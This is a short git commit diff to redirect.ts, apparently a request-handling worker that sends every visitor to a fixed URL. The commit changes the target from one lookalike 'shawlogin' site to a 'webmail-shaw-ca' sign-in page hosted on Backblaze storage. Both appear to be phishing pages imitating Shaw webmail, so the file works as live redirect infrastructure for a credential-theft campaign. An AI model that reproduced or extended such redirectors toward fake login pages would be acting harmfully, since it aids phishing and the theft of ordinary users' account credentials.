ecba68d1dd7701e2c7b3b564aad695d8c37fc36e
Gram77 <wonderland070@outlook.com>
2025-09-16 08:52:36 -0700

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://shawlogin8e880.framer.website//"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://webmail-shaw-ca.s3.us-east-005.backblazeb2.com/signin.html"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
